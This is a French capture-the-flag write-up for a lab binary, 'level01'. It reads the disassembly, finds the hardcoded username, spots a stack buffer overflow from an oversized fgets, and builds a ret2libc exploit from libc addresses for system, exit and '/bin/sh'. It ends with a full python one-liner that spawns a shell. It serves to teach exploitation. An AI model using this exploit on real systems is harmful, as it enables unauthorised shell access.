## Level01

![image](https://user-images.githubusercontent.com/29956389/94989475-68a6b380-0575-11eb-84bd-4fefd7fecc08.png)

On observe trois fonctions: `main`, `verify_user_name` et `verify_user_pass`.

![image](https://user-images.githubusercontent.com/29956389/94989125-ad7d1b00-0572-11eb-8132-d9505bf1cd52.png)

On observe l'equivalent d'un `bzero()` de 16 bytes:

![image](https://user-images.githubusercontent.com/29956389/94989418-051c8600-0575-11eb-842d-960576d34650.png)

L'affichage du banner et du prompt:

![image](https://user-images.githubusercontent.com/29956389/94989447-31380700-0575-11eb-9f0b-2932fdd638aa.png)
![image](https://user-images.githubusercontent.com/29956389/94989463-4dd43f00-0575-11eb-82ef-34872e54af29.png)

L'entrée utilisateur pour le username:

![image](https://user-images.githubusercontent.com/29956389/94989491-883ddc00-0575-11eb-8f50-9360295f830d.png)

La comparaison entre le retour de la fonction `verify_user_name` et `0x0`.

![image](https://user-images.githubusercontent.com/29956389/94989510-adcae580-0575-11eb-8d5c-65789bc82cb6.png)

![image](https://user-images.githubusercontent.com/29956389/94989135-be2d9100-0572-11eb-9c69-4cc0d1795319.png)

`0x80486a8` vaut `dat_wil`.

![image](https://user-images.githubusercontent.com/29956389/94989636-99d3b380-0576-11eb-8358-b456386086c8.png)

Le username est correct. Mais dans la fonction `verify_user_pass` la string `0x80486b0 'admin'` ne marche pas comme mot de passe.

![image](https://user-images.githubusercontent.com/29956389/94989140-c980bc80-0572-11eb-9bca-d6580d88d9fa.png)

Par contre on peut voir que notre entréé est stocke a `esp+0x1c` et qu'on lit un maximum de 0x64 bytes:

```
0x08048565 <+149>:   mov    DWORD PTR [esp+0x4],0x64
0x0804856d <+157>:   lea    eax,[esp+0x1c]
0x08048571 <+161>:   mov    DWORD PTR [esp],eax
0x08048574 <+164>:   call   0x8048370 <fgets@plt>
```
On essaye donc d'overflow le buffer:

![image](https://user-images.githubusercontent.com/29956389/94989961-daccc780-0578-11eb-9bb1-80a97de5daf0.png)

![image](https://user-images.githubusercontent.com/29956389/94989965-de604e80-0578-11eb-9852-8e948ccca999.png)

L'eip est a l'offset 80. On peut donc exploiter le binaire. Par contre aucun appel a `system(/bin/sh')` ou `printf($flag)` n'est présent dans le code, on l'exploitera donc avec une attaque ret2libc:

L'idée est d'utiliser les fonction déja présente dans le binaire (system() dans libc), et d'arranger la stack correctement pour faire executer notre code.

On localise donc l'addresse de `system`:

```
(gdb) p system
$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
```

Ainsi que la string `/bin/sh` (avec une methode un peu brute):

```
(gdb) find __libc_start_main,+99999999,"/bin/sh"
0xf7f897ec
```

Notre exploit est donc composé de :

`[ buffer permettant d'atteindre l'overflow ] [ Adresse system() ] [ Adresse retour ] [ Adresse "/bin/sh" ]`

ou 

`[ 80 bytes ] [ 0xf7e6aed0 ] [ 0xf7e5eb70 ] [ 0xf7f897ec ]`

Notre stack ressemblera donc a ceci:

![image](https://user-images.githubusercontent.com/29956389/94990364-bd4d2d00-057b-11eb-91d6-112544029694.png)

Notez l'adresse retour qui correspond a la sauvegarde de $eip pour l'instruction suivante, on y insere ici l'adresse d'exit pour quitter proprement apres l'exploit, mais ceci est optionel.

![image](https://user-images.githubusercontent.com/29956389/94990423-42384680-057c-11eb-963b-7633d8d1968a.png)

`$ (python -c 'print "dat_wilzer" + "\x0a" + "A"*80 + "\xd0\xae\xe6\xf7" + "\x70\xeb\xe5\xf7" + "\xec\x97\xf8\xf7" + "\x0a"' ; cat ) | ./level01`
